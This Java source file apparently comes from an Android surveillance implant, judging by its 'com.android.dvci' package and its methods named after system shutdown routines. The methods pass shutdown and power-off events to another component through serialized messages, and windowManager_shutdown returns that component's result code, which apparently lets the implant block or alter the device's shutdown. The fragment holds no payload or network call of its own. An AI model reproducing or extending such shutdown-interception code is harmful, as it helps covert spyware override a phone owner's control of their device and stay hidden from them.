package com.android.dvci.event.LowEvent;

import android.content.Context;

import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;
import com.android.dvci.util.LowEventMsg;

/**
 * Created by zad on 12/06/15.
 */
public class PowerDispatch {

	private static final String TAG = "PowerDispatch";



	static int windowManager_shutdown(Object sht,boolean confirm) {

		if (Cfg.DEBUG) {
			Check.log(TAG + "(windowManager_shutdown): called confirm="+ confirm);//$NON-NLS-1$
		}
		try {
			LowEventMsg obj_start = new LowEventMsg();
			PowerEvent ae = new PowerEvent(PowerEvent.POWER_STOP,"shutdown",confirm);
			obj_start.data = (java.io.Serializable) ae;
			obj_start.type = LowEventMsg.EVENT_TYPE_POWER;
			if (Cfg.DEBUG) {
				Check.log(TAG + "(windowManager_shutdown): sendSerialObj ");//$NON-NLS-1$
			}
			obj_start = LowEventMsg.sendSerialObj(obj_start, "windowManager_shutdown");
			if (Cfg.DEBUG) {
				Check.log(TAG + "(windowManager_shutdown): called ");//$NON-NLS-1$
			}
			if(obj_start!=null){
				return obj_start.res;
			}
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(windowManager_shutdown): exception ", e);//$NON-NLS-1$
			}
		}
		return LowEventMsg.RES_DO_NOTHING;
	}
	static void beginShutdownSequence(Object sht,Context context) {

		if (Cfg.DEBUG) {
			Check.log(TAG + "(beginShutdownSequence): called ");//$NON-NLS-1$
		}
		try {
			LowEventMsg obj_start = new LowEventMsg();
			PowerEvent ae = new PowerEvent(PowerEvent.POWER_STOP,"power",false);
			obj_start.data = (java.io.Serializable) ae;
			obj_start.type = LowEventMsg.EVENT_TYPE_POWER;
			if (Cfg.DEBUG) {
				Check.log(TAG + "(beginShutdownSequence): sendSerialObj ");//$NON-NLS-1$
			}
			obj_start = LowEventMsg.sendSerialObj(obj_start, "beginShutdownSequence");
			if (Cfg.DEBUG) {
				Check.log(TAG + "(beginShutdownSequence): called ");//$NON-NLS-1$
			}
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(beginShutdownSequence): exception ", e);//$NON-NLS-1$
			}
		}
	}

}
